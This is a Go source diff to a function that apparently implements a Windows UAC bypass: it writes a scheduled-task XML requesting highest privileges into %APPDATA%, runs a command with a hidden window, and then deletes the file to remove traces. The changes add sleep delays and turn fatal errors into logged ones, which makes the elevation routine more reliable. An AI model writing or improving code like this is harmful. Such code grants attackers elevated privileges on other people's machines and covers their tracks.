@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"syscall"
+	"time"
 )
 
 func HWND_W32_Method_Schtasks(path string) error {
@@ -23,7 +24,7 @@ func HWND_W32_Method_Schtasks(path string) error {
 		},
 
 		Location:    fmt.Sprintf("%s\\_schtasks.gUAC", os.Getenv("APPDATA")),
-		_K_Schtasks: 0x4,
+		_K_Schtasks: 0x5,
 	}
 
 	if len(c.Type)&len(c.Method) == 0 {
@@ -37,7 +38,7 @@ func HWND_W32_Method_Schtasks(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// XML Template for HighestAvailable priviligue ...
@@ -104,7 +105,7 @@ func HWND_W32_Method_Schtasks(path string) error {
 
 	err = ioutil.WriteFile(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")), []byte(xmlTemplate), 0666)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Executing cmd command-like ...
@@ -114,11 +115,16 @@ func HWND_W32_Method_Schtasks(path string) error {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err = cmd.Output()
 
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
+
 	// Remove file %appdata%\evelator.xml
 	err = os.Remove(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")))
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
+	// Sleep for 1 second ...
+	time.Sleep(1 * 1 * time.Second)
 	return err
 }
